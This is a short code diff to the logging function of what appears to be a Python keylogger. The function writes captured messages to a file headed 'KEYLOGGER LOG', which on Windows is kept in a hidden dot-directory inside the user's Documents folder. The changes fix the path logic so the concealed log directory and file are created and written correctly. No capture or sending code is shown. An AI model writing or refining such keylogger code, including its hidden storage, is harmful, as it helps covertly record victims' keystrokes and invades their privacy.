@@ -19,16 +19,19 @@ def write_to_log(message: str, log_name: str) -> bool:
     """
     try:
         log_path = os.path.join(LOGS_DIR, log_name)
-        log_dir = LOGS_DIR
+        log_dir = os.path.dirname(log_path)  # Get the directory from the path
+
         if is_windows():
             # Get the path to the user's "Documents" directory
             documents_dir = os.path.join(os.path.expanduser('~'), 'Documents')
 
             # Define the name of the hidden directory
-            hidden_dir_name = '.' + log_dir
+            hidden_dir_name = '.' + LOGS_DIR
 
             # Create the full path to the hidden directory
-            log_path = os.path.join(documents_dir, hidden_dir_name)
+            log_dir = os.path.join(documents_dir, hidden_dir_name)
+            log_path = os.path.join(log_dir, log_name)
+
         if not os.path.exists(log_dir):
             os.makedirs(log_dir)
             print("Directory {} created successfully!".format(log_dir))
@@ -38,7 +41,7 @@ def write_to_log(message: str, log_name: str) -> bool:
                 f.write('---- KEYLOGGER LOG ----\n')
 
         with open(log_path, 'a') as f:
-            f.write(message)
+            f.write(message + '\n')
 
         return True
     except Exception as e:
